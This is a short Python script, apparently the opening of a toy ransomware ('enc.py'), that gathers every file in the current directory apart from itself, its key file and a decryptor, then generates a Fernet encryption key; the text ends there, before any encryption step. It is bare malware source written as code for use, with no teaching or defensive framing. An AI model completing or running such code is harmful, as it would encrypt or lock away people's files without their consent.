#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#lets find some files

files = []

for file in os.listdir():
        if file == "enc.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)


key = Fernet.generate_key()